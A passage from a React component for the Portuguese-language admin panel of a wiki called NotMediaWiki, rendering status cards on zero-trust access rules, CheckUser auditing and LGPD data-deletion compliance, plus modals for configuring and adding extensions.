              Supervisão de integridade, conformidade com LGPD e auditoria de conexões.
            </p>
          </div>

          <div className="bg-red-50 border-2 border-red-600 p-4 shadow-[3px_3px_0px_0px_rgba(220,38,38,1)]">
            <span className="font-bold text-red-800 uppercase block mb-1">
              Regras Zero-Trust ABAC em Vigor
            </span>
            <p className="text-stone-800 font-mono text-xs leading-relaxed">
              O NotMediaWiki implementa autenticação estrita: apenas o burocrata oficial credenciado (<strong>pedrohenriquecardonaperes@gmail.com</strong>) possui permissão para desproteger páginas restritas ou efetuar ações destrutivas globais.
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <div className="p-4 bg-stone-50 border border-stone-300">
              <span className="font-bold uppercase text-[10px] text-stone-500 block mb-1">Comitê de Arbitragem (ArbCom)</span>
              <div className="text-sm font-bold text-stone-900">0 Disputas Abertas</div>
              <span className="text-[10px] text-emerald-700 mt-1 block">✓ Todas as resoluções em conformidade</span>
            </div>

            <div className="p-4 bg-stone-50 border border-stone-300">
              <span className="font-bold uppercase text-[10px] text-stone-500 block mb-1">CheckUser Universal</span>
              <div className="text-sm font-bold text-stone-900">Audit Trail Ativo</div>
              <span className="text-[10px] text-stone-600 mt-1 block">Hashes SHA-256 e IPs verificados</span>
            </div>

            <div className="p-4 bg-stone-50 border border-stone-300">
              <span className="font-bold uppercase text-[10px] text-stone-500 block mb-1">Conformidade LGPD</span>
              <div className="text-sm font-bold text-stone-900">Art. 18 Integrado</div>
              <span className="text-[10px] text-stone-600 mt-1 block">Painel simplificado de exclusão ativo abaixo</span>
            </div>
          </div>

          <NotMediaWikiLgpdDeletionPanel
            currentUser={currentUser}
            isBureaucrat={isBureaucrat}
            showToast={showToast}
          />
        </div>
      )}

      {/* Extension Configuration & Modification Modal (3.05.3.a, 3.05.3.b, 3.05.3.c, 3.05.3.e) */}
      <ExtensionConfigModal
        isOpen={!!configModalExt}
        extension={configModalExt}
        onClose={() => setConfigModalExt(null)}
        onSaveConfig={handleSaveExtensionConfig}
        isBureaucrat={isBureaucrat}
        currentUserEmail={currentUser?.email}
      />

      {/* Add Extension from Official Catalog Modal (3.05.3.a) */}
      <AddExtensionCatalogModal
        isOpen={isCatalogModalOpen}
        onClose={() => setIsCatalogModalOpen(false)}
        installedExtensionIds={extensions.map((e) => e.id)}
        onAddCatalogExtension={handleAddCatalogExtension}
        onAddCustomExtension={handleAddCustomExtension}
        isBureaucrat={isBureaucrat}
        currentUserEmail={currentUser?.email}
      />
    </div>
  );
}
